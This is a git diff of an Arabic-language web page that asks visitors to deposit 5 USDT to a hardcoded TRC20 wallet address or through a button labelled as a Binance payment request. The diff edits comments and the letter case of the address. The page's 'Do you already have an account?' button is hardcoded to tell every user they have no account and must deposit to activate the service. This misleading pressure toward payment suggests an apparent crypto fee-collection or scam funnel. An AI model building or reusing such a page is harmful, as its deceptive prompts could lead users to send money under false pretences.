@@ -145,7 +145,6 @@
                 </div>
                 <button type="button" onclick="goToStep2()" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; background: linear-gradient(to right, #7b2cbf, #9d4edd); color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer;">متابعة إلى الإيداع</button>
                 
-                <!-- الزر الجديد مضاف في مكان الدائرة الحمراء تماماً -->
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
                 
                 <img src="logo.png" alt="logo" class="bottom-logo">
@@ -154,7 +153,6 @@
             <!-- الخطوة الثانية: خيارات الإيداع بعد التعديل والاصلاح -->
             <div id="step2" style="display: none; margin-top: 15px;">
                 
-                <!-- الزر الأصفر المعدل بنصك ورابطك الجديد المباشر -->
                 <a href="https://binance.com" class="binance-btn-final">
                     ⚡ الدفع عبر بايننس طلب دفع
                 </a>
@@ -162,8 +160,8 @@
                 <div style="margin-top: 25px; padding: 15px; border: 1px dashed #ffffff33; border-radius: 8px; background: #0f0c1b; text-align: center;">
                     <p style="font-size: 14px; margin-bottom: 10px; color: #bbb;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                     
-                    <!-- تم تعديل الستاين هنا لمنع التفاف النص وضمان النسخ السليم في سطر واحد -->
-                    <input type="text" value="THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP" id="cryptoAddress" readonly style="font-family: 'Cairo', sans-serif; width: 100%; padding: 10px; text-align: center; background: #1a1530; color: #fff; border: 1px solid #444; border-radius: 4px; font-size: 11px; direction: ltr; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; box-sizing: border-box;">
+                    <!-- تم تصحيح حرف K ليصبح كابيتال هنا وضبط التصميم لمنع التقطيع -->
+                    <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" readonly style="font-family: 'Cairo', sans-serif; width: 100%; padding: 10px; text-align: center; background: #1a1530; color: #fff; border: 1px solid #444; border-radius: 4px; font-size: 11px; direction: ltr; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; box-sizing: border-box;">
                     
                     <button onclick="copyWalletAddress()" type="button" style="font-family: 'Cairo', sans-serif; padding: 8px 12px; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; margin-top: 12px; width: 100%;">نسخ عنوان المحفظة</button>
                 </div>
@@ -187,11 +185,10 @@
     function copyWalletAddress() {
         const copyText = document.getElementById("cryptoAddress");
         
-        // استخدام الطريقة الحديثة والمضمونة للنسخ البرمجي الصافي بدون فراغات
+        // ميزة النسخ الذكي وحذف المسافات المضافة
         navigator.clipboard.writeText(copyText.value.trim()).then(() => {
             alert("تم نسخ عنوان المحفظة بشكل سليم! قم بالتحويل من OKX أو أي محفظة أخرى على شبكة TRC20 بقيمة 5 USDT.");
         }).catch(err => {
-            // حل احتياطي للهواتف القديمة
             copyText.select();
             copyText.setSelectionRange(0, 99999);
             document.execCommand("copy");
@@ -199,7 +196,6 @@
         });
     }
 
-    // دالة التنبيه عند الضغط على الزر الجديد
     function alertNoAccount() {
         alert("أنت لا تمتلك حساباً مسبقاً، يرجى كتابة بريدك الإلكتروني وإتمام الإيداع لتفعيل الخدمة.");
     }
